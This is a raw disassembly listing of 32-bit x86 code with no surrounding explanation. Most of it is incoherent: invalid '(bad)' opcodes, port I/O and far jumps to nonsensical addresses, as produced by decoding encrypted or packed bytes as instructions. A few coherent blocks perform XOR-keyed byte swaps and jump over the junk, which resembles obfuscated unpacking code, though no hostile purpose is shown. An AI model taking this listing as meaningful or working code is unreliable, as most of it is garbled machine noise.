  4049e6:	mov    eax,ds:0x4fb831b0
  4049eb:	mov    bh,0x11
  4049ed:	mov    al,0x55
  4049ef:	(bad)  
  4049f0:	test   eax,0xcdee9550
  4049f5:	(bad)  
  4049f6:	stc    
  4049f7:	cmp    bl,bl
  4049f9:	loope  0x4049e9
  4049fb:	jl     0x404a0f
  4049fd:	sub    al,0xd3
  4049ff:	or     esp,DWORD PTR [edx-0x3]
  404a02:	in     eax,dx
  404a03:	(bad)
  404a06:	pop    eax
  404a07:	xchg   DWORD PTR [ecx-0x1df0ef0b],edi
  404a0d:	(bad)  
  404a0f:	in     al,0xd
  404a11:	ss pop ss
  404a13:	cmp    al,0xe9
  404a15:	rcr    al,0xc1
  404a18:	mov    DWORD PTR [eax],edx
  404a1a:	xor    ch,BYTE PTR [eax-0x6b]
  404a1d:	popa   
  404a1e:	jno    0x404a01
  404a20:	mov    ds:0x74516068,al
  404a25:	sahf   
  404a26:	icebp  
  404a27:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404a28:	fs out dx,eax
  404a2a:	scas   eax,DWORD PTR es:[edi]
  404a2b:	stos   BYTE PTR es:[edi],al
  404a2c:	imul   ebx,DWORD PTR [esi+0x3d],0xa67947c5
  404a33:	or     DWORD PTR [ecx-0x52],ebp
  404a36:	pop    edi
  404a37:	outs   dx,BYTE PTR ds:[esi]
  404a38:	mov    DWORD PTR [ebx+edx*8+0x29],eax
  404a3c:	adc    bh,BYTE PTR [ecx]
  404a3e:	(bad)  
  404a3f:	jo     0x404a68
  404a41:	xchg   DWORD PTR [ebp+0x1dcee044],eax
  404a47:	(bad)  
  404a48:	mov    esi,0x1abc2434
  404a4d:	pop    eax
  404a4e:	adc    al,0x2c
  404a50:	add    bl,bl
  404a52:	cdq    
  404a53:	loope  0x404a38
  404a55:	mov    edi,0x8aaff4ee
  404a5a:	call   0xe2ed:0x31ff80a3
  404a61:	in     eax,0xaa
  404a63:	aam    0x89
  404a65:	popf   
  404a66:	pop    edx
  404a67:	push   0xbf181d2d
  404a6c:	ins    DWORD PTR es:[edi],dx
  404a6d:	inc    esi
  404a6e:	call   0x3d5a:0xc43e2ccc
  404a75:	xchg   edi,eax
  404a76:	add    al,0xea
  404a78:	mov    DWORD PTR cs:[edx-0x3a],0x7f0697f8
  404a80:	ror    eax,0xe7
  404a83:	(bad)  
  404a85:	adc    BYTE PTR [edx],cl
  404a87:	stos   DWORD PTR es:[edi],eax
  404a88:	sbb    BYTE PTR [edx-0x7b],bl
  404a8b:	and    eax,0x27ed545f
  404a90:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404a91:	jg     0x404a51
  404a93:	sub    esp,esp
  404a95:	add    ecx,edi
  404a97:	xor    al,0xc0
  404a99:	imul   ebp,esi,0x391367f1
  404a9f:	pop    esi
  404aa0:	(bad)  
  404aa1:	push   edx
  404aa2:	clc    
  404aa3:	jmp    0x32f4:0x45c71869
  404aaa:	test   DWORD PTR [eax+edi*8+0x33bc45c7],ebx
  404ab1:	test   DWORD PTR [eax+edi*8+0x33e8558b],ebx
  404ab8:	rol    BYTE PTR [ebx],1
  404aba:	shr    ecx,1
  404abc:	imul   eax,DWORD PTR [ebx],0x0
  404abf:	add    BYTE PTR [ebx-0x2fcc17ab],cl
  404ac5:	add    edx,DWORD PTR [ebp-0x14]
  404ac8:	mov    edi,DWORD PTR [ebp-0x1c]
  404acb:	mov    dl,BYTE PTR [edx+edi*1+0x32729b]
  404ad2:	mov    BYTE PTR [ebp+0xf],dl
  404ad5:	mov    edx,DWORD PTR [ebp-0xc]
  404ad8:	xor    edx,eax
  404ada:	add    edx,DWORD PTR [ebp-0x14]
  404add:	mov    edi,DWORD PTR [ebp-0x1c]
  404ae0:	mov    dl,BYTE PTR [edx+edi*1+0x32729b]
  404ae7:	mov    BYTE PTR [ebp+0xb],dl
  404aea:	mov    dl,BYTE PTR [ebp+0xf]
  404aed:	mov    edi,DWORD PTR [ebp-0xc]
  404af0:	xor    edi,eax
  404af2:	add    edi,DWORD PTR [ebp-0x14]
  404af5:	mov    ebx,DWORD PTR [ebp-0x1c]
  404af8:	mov    BYTE PTR [edi+ebx*1+0x32729b],dl
  404aff:	mov    dl,BYTE PTR [ebp+0xb]
  404b02:	mov    edi,DWORD PTR [ebp-0x18]
  404b05:	xor    edi,eax
  404b07:	add    edi,DWORD PTR [ebp-0x14]
  404b0a:	mov    ebx,DWORD PTR [ebp-0x1c]
  404b0d:	mov    BYTE PTR [edi+ebx*1+0x32729b],dl
  404b14:	mov    edx,DWORD PTR [ebp-0x44]
  404b17:	mov    edi,DWORD PTR [ebp-0xc]
  404b1a:	xor    edx,eax
  404b1c:	xor    edi,eax
  404b1e:	add    edx,ecx
  404b20:	jmp    0x404e23
  404b25:	xor    ebx,esi
  404b27:	adc    edx,ebp
  404b29:	shl    ebp,1
  404b2b:	icebp  
  404b2c:	repz xor eax,0x8a3c6a28
  404b32:	out    dx,eax
  404b33:	ins    BYTE PTR es:[edi],dx
  404b34:	jb     0x404ad8
  404b36:	and    bh,BYTE PTR [esi+0x7e]
  404b39:	pop    eax
  404b3a:	jl     0x404bba
  404b3c:	jle    0x404b1b
  404b3e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404b3f:	fbstp  TBYTE PTR [esi-0x530e8eed]
  404b45:	js     0x404b47
  404b47:	sbb    BYTE PTR [esi+edi*2],bl
  404b4a:	cmc    
  404b4b:	in     eax,dx
  404b4c:	es pop ecx
  404b4e:	test   al,0xe9
  404b50:	jmp    0x404b48
  404b52:	xor    ebp,DWORD PTR [edx]
  404b54:	cwde   
  404b55:	sub    ecx,DWORD PTR [edi+eiz*8-0x2db8a431]
  404b5c:	lock jb 0x404b57
  404b5f:	jbe    0x404b9b
  404b61:	test   eax,0x5b9a37dc
  404b66:	shl    DWORD PTR [edx-0x63e4d650],0xe8
  404b6d:	add    al,BYTE PTR ds:0x95005a10
  404b73:	ss adc al,0xde
  404b76:	imul   edx,DWORD PTR [ebp-0x75],0x7c
  404b7a:	inc    edi
  404b7b:	fwait
  404b7c:	sahf   
  404b7d:	sub    eax,0x4f36d0f9
  404b82:	mov    BYTE PTR [ebx],bl
  404b84:	scas   al,BYTE PTR es:[edi]
  404b85:	dec    esi
  404b86:	push   0xf8a63412
  404b8b:	fldcw  WORD PTR [ebx+eax*1-0x549baef8]
  404b92:	sub    eax,0x5d
  404b95:	(bad)  
  404b96:	int3   
  404b97:	pop    es
  404b98:	cld    
  404b99:	push   ebx
  404b9a:	fldcw  WORD PTR [edi+0x6b]
  404b9d:	loope  0x404b31
  404b9f:	cmc    
  404ba0:	mov    ?,esp
  404ba2:	jp     0x404c04
  404ba4:	in     eax,0xe
  404ba6:	push   0xd3bb7f35
  404bab:	sahf   
  404bac:	push   esi
  404bad:	loope  0x404b59
  404baf:	pushf  
  404bb0:	add    bh,BYTE PTR [edx-0x12b458bd]
  404bb6:	and    al,0x88
  404bb8:	cmp    al,0x9d
  404bba:	dec    edx
  404bbb:	test   DWORD PTR [ecx+0x7],ebx
  404bbe:	push   ecx
  404bbf:	icebp  
  404bc0:	imul   edi,ecx,0x3495b4a1
  404bc6:	aas    
  404bc7:	mov    eax,DWORD PTR [edx]
  404bc9:	jno    0x404bcb
  404bcb:	xor    al,0xf2
  404bcd:	jns    0x404c38
  404bcf:	mov    al,ds:0x1c1f20d5
  404bd4:	add    DWORD PTR [esi-0x65],edx
  404bd7:	in     eax,0x6c
  404bd9:	(bad)  
  404bda:	fcomi  st,st(4)
  404bdc:	mov    bl,0x7
  404bde:	jbe    0x404bcf
  404be0:	test   al,0xef
  404be2:	and    edx,eax
  404be4:	jns    0x404bbe
  404be6:	sbb    al,0xc3
  404be8:	clc    
  404be9:	inc    eax
  404bea:	pop    ebx
  404beb:	jns    0x404c04
  404bed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404bee:	mov    bl,0x98
  404bf0:	sub    ecx,DWORD PTR [eax+0x72]
  404bf3:	cld    
  404bf4:	sub    eax,0x5142e87b
  404bf9:	retf   0xfd18
  404bfc:	dec    edx
  404bfd:	hlt    
  404bfe:	fld    TBYTE PTR [eax+0x54]
  404c01:	jo     0x404c70
  404c03:	scas   eax,DWORD PTR es:[edi]
  404c04:	adc    DWORD PTR [esi+esi*8+0x1f51866a],eax
  404c0b:	sar    BYTE PTR [edx+0x473314a5],cl
  404c11:	shl    BYTE PTR [esi],1
  404c13:	loopne 0x404bb5
  404c15:	imul   ebp,eax,0x16
  404c18:	repnz pop edx
  404c1a:	sub    BYTE PTR [ebp+eax*1-0x3ce4ae3e],dl
  404c21:	loop   0x404bdd
  404c23:	push   esp
  404c24:	imul   ecx,esi,0xa8a17cde
  404c2a:	xor    eax,0x90acdd11
  404c2f:	mov    cl,0xfb
  404c31:	inc    edi
  404c32:	ss fwait
  404c34:	and    DWORD PTR [ebx-0x66],edx
  404c37:	add    al,0x20
  404c39:	jb     0x404c64
  404c3b:	not    BYTE PTR ds:0xf3adaade
  404c41:	xchg   DWORD PTR [edx+0x61],ebx
  404c44:	test   eax,0x802da090
  404c49:	inc    edx
  404c4a:	sub    BYTE PTR [ecx],cl
  404c4c:	ja     0x404c52
  404c4e:	outs   dx,DWORD PTR ds:[esi]
  404c4f:	mov    edi,0xa9c6bab3
  404c54:	pop    ss
  404c55:	xchg   ecx,eax
  404c56:	dec    esi
  404c57:	sahf   
  404c58:	pop    ecx
  404c59:	adc    BYTE PTR [edx],bl
  404c5b:	gs push cs
  404c5d:	shl    BYTE PTR ss:[esi+eax*1-0x288711dc],cl
  404c65:	inc    edi
  404c66:	mov    cl,0x44
  404c68:	xchg   ebp,eax
  404c69:	imul   ebp,DWORD PTR [eax+0x44],0xffffff81
  404c6d:	ins    BYTE PTR es:[edi],dx
  404c6e:	inc    esp
  404c6f:	out    dx,eax
  404c70:	in     eax,dx
  404c71:	push   es
  404c72:	xchg   DWORD PTR [edx+0x6c],edx
  404c75:	lock ss test al,0x7b
  404c79:	in     eax,dx
  404c7a:	sti    
  404c7b:	or     eax,0x9fca3b8b
  404c80:	push   esp
  404c81:	sbb    DWORD PTR [esi+0x73436146],esi
  404c87:	mov    eax,ds:0xcf6f9636
  404c8c:	mov    esi,0x8afea2be
  404c91:	lods   eax,DWORD PTR ds:[esi]
  404c92:	push   cs
  404c93:	sbb    eax,0xd42f27ff
  404c98:	sbb    edx,DWORD PTR [ecx+0x2b5963f7]
  404c9e:	push   esp
  404c9f:	lock cli 
  404ca1:	push   ss
  404ca2:	int    0x2b
  404ca4:	inc    edx
  404ca5:	inc    eax
  404ca6:	not    bh
  404ca8:	mov    ds:0xca508814,al
  404cad:	mov    ecx,0x8e75dcd6
  404cb2:	mov    ds:0x2a33e176,al
  404cb7:	adc    esp,DWORD PTR [ecx+edi*4+0x71]
  404cbb:	and    ch,dh
  404cbd:	retf   0x2320
  404cc0:	mov    ah,0xfe
  404cc2:	pusha  
  404cc3:	push   ds
  404cc4:	pop    ebx
  404cc5:	jmp    0x954bd423
  404cca:	test   BYTE PTR [ebp-0x26],bl
  404ccd:	std    
  404cce:	adc    DWORD PTR [esi+0x4a5df008],esp
  404cd4:	cld    
  404cd5:	inc    BYTE PTR [esi]
  404cd7:	into   
  404cd8:	js     0x404cb6
  404cda:	and    ebx,DWORD PTR [eax+0x6]
  404cdd:	sahf   
  404cde:	xchg   bl,ch
  404ce0:	mov    WORD PTR [edx+0x59],fs
  404ce3:	pop    esp
  404ce4:	aas    
  404ce5:	test   al,0xc4
  404ce7:	push   ebx
  404ce8:	lods   eax,DWORD PTR ds:[esi]
  404ce9:	cdq    
  404cea:	sub    DWORD PTR [ecx-0x262b2ef7],ebx
  404cf0:	fnstsw WORD PTR [eax]
  404cf2:	add    dh,bh
  404cf4:	sbb    esi,DWORD PTR gs:[edx]
  404cf7:	aaa    
  404cf8:	stos   BYTE PTR es:[edi],al
  404cf9:	and    DWORD PTR [ecx+0x7a],ebp
  404cfc:	mov    al,ch
  404cfe:	les    ecx,FWORD PTR [esi+0x657acf84]
  404d04:	cmp    eax,DWORD PTR [ebx]
  404d06:	dec    edi
  404d07:	cmovb  ebx,DWORD PTR ds:0x5e980af3
  404d0e:	sti    
  404d0f:	and    BYTE PTR [eax],ah
  404d11:	int    0x81
  404d13:	out    dx,al
  404d14:	bnd ret 
  404d16:	mov    ds:0x273a70ae,al
  404d1b:	add    eax,0x47de2701
  404d20:	jp     0x404cb7
  404d22:	sub    cl,cl
  404d24:	sub    cl,dh
  404d26:	dec    ebx
  404d27:	arpl   WORD PTR [ecx+0x646fef19],si
  404d2d:	sub    BYTE PTR [eax-0x608499e1],ch
  404d33:	mov    ah,0x3b
  404d35:	cdq    
  404d36:	cmp    DWORD PTR [esi],esi
  404d38:	ret    0x1e2d
  404d3b:	ds aas 
  404d3d:	lock push ss
  404d3f:	mov    dh,0x7e
  404d41:	pop    es
  404d42:	out    dx,al
  404d43:	jno    0x404d12
  404d45:	mov    eax,ds:0x756091c2
  404d4a:	leave  
  404d4b:	in     al,dx
  404d4c:	sub    eax,0x27821973
  404d51:	mov    dl,0x27
  404d53:	cmp    BYTE PTR [ebx],al
  404d55:	adc    ah,BYTE PTR [edi]
  404d57:	mov    eax,ds:0xa0d9f963
  404d5c:	and    eax,0x6819f059
  404d61:	and    eax,0x8150005c
  404d66:	icebp  
  404d67:	dec    DWORD PTR [edx-0x3dc4095e]
  404d6d:	sub    esi,DWORD PTR [edx+0x18f954a7]
  404d73:	stc    
  404d74:	cli    
  404d75:	xor    BYTE PTR [ecx-0xb],ah
  404d78:	iret   
  404d79:	jg     0x404da3
  404d7b:	xchg   DWORD PTR [ebp+0x6c],ebx
  404d7e:	xlat   BYTE PTR ds:[ebx]
  404d7f:	es ror DWORD PTR gs:[eiz*8+0x29b7a88],cl
  404d88:	data16 daa 
  404d8a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404d8b:	dec    esi
  404d8c:	dec    esi
  404d8d:	bound  ebp,QWORD PTR [edx-0x2d]
  404d90:	lea    ebx,[edx-0x31]
  404d93:	pop    edx
  404d94:	sbb    ebx,DWORD PTR ds:0x84c8b28c
  404d9a:	ins    BYTE PTR es:[edi],dx
  404d9b:	sub    dh,BYTE PTR [ecx-0x52909999]
  404da1:	hlt    
  404da2:	sub    BYTE PTR [esi],0xb4
  404da5:	data16 fwait
  404da7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404da8:	add    bh,0x8f
  404dab:	stos   BYTE PTR es:[edi],al
  404dac:	out    dx,al
  404dad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404dae:	xchg   esi,eax
  404daf:	imul   esp,DWORD PTR [ecx],0xffffffab
  404db2:	xor    eax,0xc2b7f4d2
  404db7:	cld    
  404db8:	or     al,BYTE PTR [edx]
  404dba:	pop    eax
  404dbb:	jno    0x404da9
  404dbd:	jmp    0x4bb1:0x4ed3eb34
  404dc4:	adc    bh,dh
  404dc6:	std    
  404dc7:	inc    esp
  404dc8:	sbb    bh,BYTE PTR [esi]
  404dca:	mov    edx,0xd8008b10
  404dcf:	lock aam 0x57
  404dd2:	mov    bl,0x0
  404dd4:	shl    DWORD PTR [edi-0x57aaffe7],cl
  404dda:	ins    BYTE PTR es:[edi],dx
  404ddb:	(bad)  
  404ddc:	ss xchg edx,eax
  404dde:	mov    esp,0x8a9b9433
  404de3:	leave  
  404de4:	cmp    DWORD PTR [ebx+0x4a],ebp
  404de7:	es pop ebp
  404de9:	mov    ds:0xccdefacf,al
  404dee:	inc    edx
  404def:	push   0x7c08d1d3
  404df4:	jle    0x404d95
  404df6:	mov    ebx,0xe237681a
  404dfb:	xchg   esi,eax
  404dfc:	xlat   BYTE PTR ds:[ebx]
  404dfd:	popf   
  404dfe:	push   ebx
  404dff:	jmp    0x493b:0x6ed34c91
  404e06:	outs   dx,BYTE PTR ds:[esi]
  404e07:	loopne 0x404e49
  404e09:	stos   DWORD PTR es:[edi],eax
  404e0a:	sbb    eax,0xa4d636fe
  404e0f:	jae    0x404e57
  404e11:	xlat   BYTE PTR ds:[ebx]
  404e12:	xchg   ecx,eax
  404e13:	cld    
  404e14:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404e15:	add    BYTE PTR [ebx+0x6408f857],dh
  404e1b:	scas   eax,DWORD PTR es:[di]
  404e1d:	add    ecx,DWORD PTR [esi]
  404e1f:	pop    ebp
  404e20:	fcomp  st(1)
  404e22:	arpl   WORD PTR [ebx],ax
  404e24:	stc    
  404e25:	imul   edx,edi
  404e28:	add    edx,DWORD PTR [ebp-0x14]
  404e2b:	mov    DWORD PTR [ebp-0x14],edx
  404e2e:	mov    edx,DWORD PTR [ebp-0xc]
  404e31:	mov    edi,DWORD PTR [ebp-0x24]
  404e34:	xor    edx,eax
  404e36:	add    edx,ecx
  404e38:	imul   edx,edi
  404e3b:	mov    edi,DWORD PTR [ebp-0xc]
  404e3e:	xor    edi,eax
  404e40:	sub    edx,edi
  404e42:	mov    edi,DWORD PTR [ebp-0xc]
  404e45:	mov    ebx,DWORD PTR [ebp-0x14]
  404e48:	xor    edi,eax
  404e4a:	add    edi,ecx
  404e4c:	jmp    0x40514f
  404e51:	xlat   BYTE PTR ds:[ebx]
  404e52:	pop    eax
  404e53:	mov    ds:0x51e5b1dc,eax
  404e58:	jno    0x404e33
  404e5a:	stc    
  404e5b:	hlt    
  404e5c:	jb     0x404ec9
  404e5e:	test   al,0x1a
  404e60:	mov    bh,0x8c
  404e62:	and    DWORD PTR [esi+0x7e],edi
  404e65:	pop    eax
  404e66:	jl     0x404ee6
  404e68:	jle    0x404ec6
  404e6a:	fcmovnbe st,st(7)
  404e6c:	sub    DWORD PTR [esi+0x681733f],ebp
  404e72:	jl     0x404e62
  404e74:	pop    edx
  404e75:	mov    al,ds:0xc8f31bc0
  404e7a:	pop    ebp
  404e7b:	dec    edx
  404e7c:	sti    
  404e7d:	adc    al,BYTE PTR [edi+edx*8+0x55]
  404e81:	cmc    
  404e82:	ret    
  404e83:	ja     0x404efd
  404e85:	pop    ss
  404e86:	mov    esp,0x39212f4a
  404e8b:	lahf   
  404e8c:	fwait
  404e8d:	imul   BYTE PTR [edi+0x73ad6dd4]
  404e93:	xor    al,0xa3
  404e95:	and    DWORD PTR [edx-0x59],0xc6c6a483
  404e9c:	adc    DWORD PTR [edi*8+0x223cef63],0x68
  404ea4:	addr16 leave 
  404ea6:	cld    
  404ea7:	sbb    esi,DWORD PTR [esi+0x2c]
  404eaa:	mov    WORD PTR [edx+0x12b22dfe],es
  404eb0:	mov    BYTE PTR [ebp-0x1e],dl
  404eb3:	gs xor al,0xf2
  404eb6:	and    eax,0x76e6dbac
  404ebb:	dec    ebx
  404ebc:	mov    ds:0x56deee7c,eax
  404ec1:	out    0xad,al
  404ec3:	adc    esp,DWORD PTR [ebx]
  404ec5:	or     al,0x57
  404ec7:	adc    eax,0xb441e114
  404ecc:	adc    DWORD PTR [esp+eax*2+0x2e87d8b6],ebp
  404ed3:	test   BYTE PTR [esi],cl
  404ed5:	mov    es,ebp
  404ed7:	dec    esi
  404ed8:	cdq    
  404ed9:	adc    al,0x16
  404edb:	dec    eax
  404edc:	xor    ebx,DWORD PTR [esi-0x5ca3d904]
  404ee2:	jb     0x404e86
  404ee4:	cmp    BYTE PTR ds:0xccefa795,bh
  404eea:	push   esp
  404eeb:	jle    0x404e7a
  404eed:	(bad)
  404ef0:	lahf   
  404ef1:	or     cl,cl
  404ef3:	or     al,0x47
  404ef5:	pop    ds
  404ef6:	pusha  
  404ef7:	div    DWORD PTR [bp-0x2f06]
  404efc:	scas   al,BYTE PTR es:[edi]
  404efd:	add    dl,BYTE PTR [edx+0x54c353c3]
  404f03:	out    dx,eax
  404f04:	popf   
  404f05:	jmp    0xc0993d08
  404f0a:	mov    ds,WORD PTR [esi+ebx*1+0x214470e7]
  404f11:	ss icebp 
  404f13:	xchg   ebx,eax
  404f14:	out    0xa1,eax
  404f16:	xor    eax,0x1cd6df8d
  404f1b:	pop    ebx
  404f1c:	or     cl,bl
  404f1e:	and    al,0xb1
  404f20:	lock aam 0x95
  404f23:	sub    ebp,DWORD PTR [ecx+0x7d]
  404f26:	dec    eax
  404f27:	jge    0x404ec4
  404f29:	ins    BYTE PTR es:[edi],dx
  404f2a:	pusha  
  404f2b:	cmp    DWORD PTR [esp+ecx*4+0x3c7e38e8],ecx
  404f32:	xor    al,0x97
  404f34:	fsubr  DWORD PTR [esi-0x33]
  404f37:	cmp    eax,esp
  404f39:	stc    
  404f3a:	cmp    dh,BYTE PTR [ebx+0x322d3449]
  404f40:	push   cs
  404f41:	cmp    eax,0x87d9ab
  404f46:	sbb    esi,ecx
  404f48:	int    0x1
  404f4a:	and    edx,DWORD PTR [ebp-0x8]
  404f4d:	and    al,0x5b
  404f4f:	daa    
  404f50:	jp     0x404f78
  404f52:	pop    edi
  404f53:	pusha  
  404f54:	iret   
  404f55:	inc    edi
  404f56:	xchg   BYTE PTR [esi*2+0x793dbe54],dl
  404f5d:	and    DWORD PTR [edx+0x18],0x2
  404f61:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404f62:	mov    al,ds:0x9d9a89c7
  404f67:	leave  
  404f68:	xor    BYTE PTR [ecx+0x2b],bh
  404f6b:	ss je  0x404fb4
  404f6e:	jnp    0x404fd1
  404f70:	retf   
  404f71:	mov    DWORD PTR [edx+0x49d97985],edx
  404f77:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404f78:	adc    eax,0x5507ec9d
  404f7d:	lea    edx,[eax-0x64]
  404f80:	retf   
  404f81:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404f82:	std    
  404f83:	pop    esp
  404f84:	ret    
  404f85:	mov    eax,ds:0xba2b8a21
  404f8a:	xlat   BYTE PTR ds:[ebx]
  404f8b:	rcr    BYTE PTR [edi+ecx*8],1
  404f8e:	xchg   ebx,eax
  404f8f:	les    ebx,FWORD PTR [eax+0xf62e97f]
  404f95:	pop    edx
  404f96:	fld    TBYTE PTR [esi-0x49]
  404f99:	inc    esi
  404f9a:	fwait
  404f9b:	push   ss
  404f9c:	fidiv  WORD PTR [eax]
  404f9e:	add    DWORD PTR [esi],ecx
  404fa0:	push   ecx
  404fa1:	stos   BYTE PTR es:[edi],al
  404fa2:	call   0xf6ac4946
  404fa7:	and    BYTE PTR [ebx-0x9],ch
  404faa:	push   eax
  404fab:	adc    DWORD PTR [esi-0x16],eax
  404fae:	leave  
  404faf:	push   es
  404fb0:	test   esp,ecx
  404fb2:	aam    0xc5
  404fb4:	int3   
  404fb5:	push   esp
  404fb6:	sub    DWORD PTR [ecx+eiz*1+0x74],0xd7f47a4
  404fbe:	adc    BYTE PTR [ebx-0x6637349d],ch
  404fc4:	inc    edx
  404fc5:	jno    0x404feb
  404fc7:	sub    al,0x18
  404fc9:	add    bl,BYTE PTR [ebx+eiz*1+0x73]
  404fcd:	sbb    BYTE PTR [ecx+0x53],0x56
  404fd1:	fmul   DWORD PTR [edi-0x2fc9b4e4]
  404fd7:	add    BYTE PTR [edx+0x27688d34],bl
  404fdd:	jmp    0x261ff010
  404fe2:	pop    esi
  404fe3:	mov    dl,BYTE PTR [ecx]
  404fe5:	jecxz  0x404fb4
  404fe7:	loopne 0x405024
  404fe9:	and    ecx,DWORD PTR [edx+eax*4-0xe]
  404fed:	test   eax,0x1f3bcd68
  404ff2:	fld    st(5)
  404ff5:	dec    edx
  404ff6:	sbb    BYTE PTR [ecx],al
  404ff8:	pop    eax
  404ff9:	and    edx,DWORD PTR [edi+0x584337d1]
  404fff:	ror    DWORD PTR [ecx],1
  405001:	(bad)  
  405002:	pop    esp
  405003:	call   0xa42d:0x2593e8cc
  40500a:	out    0x5d,al
  40500c:	cli    
  40500d:	sbb    bh,bl
  40500f:	retf   
  405010:	push   ebp
  405011:	pop    esi
  405012:	in     eax,dx
  405013:	sbb    DWORD PTR [esi+0x0],ecx
  405016:	mov    esp,0xd34734b5
  40501b:	test   BYTE PTR [eax],ch
  40501d:	test   al,0x52
  40501f:	iret   
  405020:	dec    edi
  405021:	xchg   ebx,eax
  405022:	mov    bl,0x78
  405024:	pop    ss
  405025:	sub    BYTE PTR [esi],0x3c
  405028:	cmp    dl,bh
  40502a:	imul   esi,DWORD PTR [edi+0x5d],0x7a1ab291
  405031:	push   es
  405032:	push   ebx
  405033:	add    eax,DWORD PTR [edx-0x76]
  405036:	adc    al,0x5b
  405038:	les    edx,FWORD PTR [ebx]
  40503a:	mov    ds:0x16c6ed71,eax
  40503f:	mov    eax,ds:0x21aa973d
  405044:	scas   eax,DWORD PTR es:[edi]
  405045:	outs   dx,DWORD PTR ds:[si]
  405047:	xor    ebp,esp
  405049:	out    0xe1,eax
  40504b:	test   eax,0x43219701
  405050:	xor    eax,0x8bc2378
  405055:	(bad)  
  405056:	add    eax,0x9bb28466
  40505b:	cwde   
  40505c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40505d:	inc    ebp
  40505e:	xchg   edx,eax
  40505f:	cmp    eax,0xd296025b
  405064:	sahf   
  405065:	pop    ss
  405066:	xor    eax,DWORD PTR [eax+0x73]
  405069:	push   edx
  40506a:	pop    ds
  40506b:	outs   dx,BYTE PTR ss:[esi]
  40506d:	jno    0x405014
  40506f:	sbb    ecx,ecx
  405071:	out    dx,eax
  405072:	pop    edx
  405073:	mov    al,ds:0x4464c999
  405078:	popa   
  405079:	pop    ds
  40507a:	hlt    
  40507b:	cwde   
  40507c:	addr16 pop ds
  40507e:	or     cl,bl
  405080:	mov    DWORD PTR [ecx],edi
  405082:	push   0xcb9ca5ea
  405087:	sbb    ah,0x49
  40508a:	jnp    0x4050fd
  40508c:	add    DWORD PTR [edi],eax
  40508e:	mov    cl,0x42
  405090:	push   ecx
  405091:	lea    ecx,[eax-0x22]
  405094:	pop    esp
  405095:	and    al,dl
  405097:	mov    eax,0x8c3400a2
  40509c:	jnp    0x405093
  40509e:	pushf  
  40509f:	js     0x4050fc
  4050a1:	inc    ebp
  4050a2:	into   
  4050a3:	and    ebx,ebp
  4050a5:	cli    
  4050a6:	xchg   esi,eax
  4050a7:	popa   
  4050a8:	jno    0x40504c
  4050aa:	xchg   ecx,eax
  4050ab:	scas   eax,DWORD PTR es:[edi]
  4050ac:	add    eax,0x81d97337
  4050b1:	ins    DWORD PTR es:[edi],dx
  4050b2:	ret    0xac01
  4050b5:	jne    0x405044
  4050b7:	lods   al,BYTE PTR ds:[esi]
  4050b8:	push   ebp
  4050b9:	jae    0x40503e
  4050bb:	sub    BYTE PTR [ebx],0x5a
  4050be:	add    BYTE PTR [esi-0x67],dh
  4050c1:	xor    dh,bl
  4050c3:	dec    ebx
  4050c4:	xor    al,0x46
  4050c6:	rcr    BYTE PTR [edi-0x38],cl
  4050c9:	(bad)  
  4050ca:	repnz and al,0x4d
  4050cd:	dec    ebp
  4050ce:	in     eax,dx
  4050cf:	imul   eax,eax,0x5c1ae31c
  4050d5:	cmp    cl,BYTE PTR [ecx+0x26606384]
  4050db:	loopne 0x4050db
  4050dd:	shr    edi,cl
  4050df:	xor    BYTE PTR [ebp-0x1071548d],dl
  4050e5:	idiv   BYTE PTR [eax-0x1d]
  4050e8:	xchg   cl,ch
  4050ea:	push   ds
  4050eb:	jbe    0x405111
  4050ed:	mov    bh,0x8e
  4050ef:	add    DWORD PTR [edx+0x713ea733],ebx
  4050f5:	push   ebx
  4050f6:	js     0x405081
  4050f8:	mov    ebx,0xdf36308c
  4050fd:	or     bh,BYTE PTR ds:0x2978b4ad
  405103:	jge    0x40515c
  405105:	adc    esp,0x4f50ecef
  40510b:	out    dx,al
  40510c:	mov    edx,0x364fe22e
  405111:	mov    eax,ds:0x6c82ecc2
  405116:	call   0x66aa61
  40511b:	outs   dx,BYTE PTR ds:[esi]
  40511c:	popa   
  40511d:	dec    edi
  40511e:	iret   
  40511f:	aad    0x44
  405121:	(bad)  
  405122:	(bad)  
  405123:	mov    ch,0xfd
  405125:	mov    ecx,ebx
  405127:	rcl    BYTE PTR [ecx+0x70],0xbf
  40512b:	repz and dh,al
  40512e:	adc    eax,0x88833cb9
  405133:	mov    al,0xd6
  405135:	xchg   BYTE PTR [eax+ebp*2],dl
  405138:	cwde   
  405139:	mov    ecx,0xad9507b
  40513e:	mov    al,0x35
  405140:	add    ch,BYTE PTR [ebp+0x8]
  405143:	pop    esp
  405144:	adc    BYTE PTR [ebp+0x39],0xd5
  405148:	cmc    
  405149:	retf   0x3f8b
  40514c:	sbb    DWORD PTR [edx],edi
  40514e:	ss imul edi,ebx
  405152:	mov    ebx,DWORD PTR [ebp-0x18]
  405155:	xor    ebx,eax
  405157:	sub    edx,ecx
  405159:	lea    edi,[edi+ebx*1+0x32729b]
  405160:	jmp    0x405463
  405165:	pusha  
  405166:	das    
  405167:	sti    
  405168:	pop    eax
  405169:	push   ecx
  40516a:	push   0x65ca3761
  40516f:	out    0x76,eax
  405171:	fidiv  WORD PTR ds:0x2cf6258c
  405177:	jle    0x4051f7
  405179:	pop    eax
  40517a:	jl     0x4051fa
  40517c:	jle    0x4051d2
  40517e:	sbb    eax,0xa77eab00
  405183:	mov    al,ds:0xfd5ff39
  405188:	pusha  
  405189:	stc    
  40518a:	outs   dx,BYTE PTR ds:[esi]
  40518b:	mov    BYTE PTR [edi],cl
  40518d:	jle    0x4051b5
  40518f:	add    ah,BYTE PTR [eax+0x5683a3d2]
  405195:	loopne 0x4051a7
  405197:	retf   
  405198:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405199:	mov    ebp,0xfcc19ecd
  40519e:	aad    0x3c
  4051a0:	popa   
  4051a1:	aam    0xe2
